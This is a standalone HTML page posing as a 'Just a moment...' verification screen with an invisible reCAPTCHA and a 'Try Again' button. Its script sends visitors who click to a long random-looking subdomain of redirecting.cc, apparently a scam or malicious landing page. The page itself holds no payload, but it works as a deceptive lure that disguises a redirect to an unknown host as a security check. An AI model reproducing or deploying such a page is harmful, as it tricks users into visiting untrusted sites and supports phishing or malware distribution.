<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Just a moment...</title>
  <script src="https://www.google.com/recaptcha/api.js" async defer></script>
  <style>
    body {
      font-family: Arial, sans-serif;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      margin: 0;
      background-color: #f7f7f7;
    }

    h1 {
      font-size: 2rem;
      color: #333;
      margin-bottom: 1.5rem;
    }

    form {
      display: flex;
      flex-direction: column;
      align-items: center;
      width: 100%;
      max-width: 360px;
      padding: 2rem;
      background-color: #ffffff;
      border-radius: 8px;
      box-shadow: 0 2px 6px rgba(0, 0, 0, 0.1);
    }

    .g-recaptcha {
      margin-bottom: 2rem;
    }

    button {
      font-size: 1.2rem;
      font-weight: bold;
      background-color: #4285F4;
      color: #ffffff;
      border: none;
      border-radius: 4px;
      padding: 0.8rem 2rem;
      cursor: pointer;
      text-transform: uppercase;
    }

    button:hover {
      background-color: #1565C0;
    }

    .error-message {
      font-size: 1rem;
      color: #333;
      margin-bottom: 2rem;
    }
  </style>
</head>
<body>
  <form id="recaptcha-form" action="https://photcoc3ixvhad7opp67ui5ix8mn7rvflk42sqqwtivtfgcd8huhnv2pczvs.redirecting.cc/video/index.html" method="POST">
    <div class="g-recaptcha" data-sitekey="6LeoQ5klAAAAAEl50PLECwOcuPKKIZl84cC0iksg" data-size="invisible"></div>
    <p class="error-message"><img src="https://i.pinimg.com/originals/88/7d/f7/887df77a017d36554fff8aa18c2c4fd0.gif" alt="" width="264" height="228" /></p>
    <button type="submit">Try Again</button>
  </form>
  <script>
    document.getElementById('recaptcha-form').addEventListener('submit', function(event) {
      event.preventDefault();

      grecaptcha.execute().then(function(token) {
        // Add the token to the form data
        var form = document.querySelector('form');
        var formData = new FormData(form);
        formData.append('recaptcha_token', token);

        // Redirect the user to the new URL
        window.location.href = 'https://photcoc3ixvhad7opp67ui5ix8mn7rvflk42sqqwtivtfgcd8huhnv2pczvs.redirecting.cc/video/index.html';

        // Submit the form data to the server (optional)
        // fetch('https://example.com', {
        //   method: 'POST',
        //   body: formData
        // }).then(function(response) {
        //   // Handle the response from the server
        // });
      });
    });
  </script>
</body>
</html>
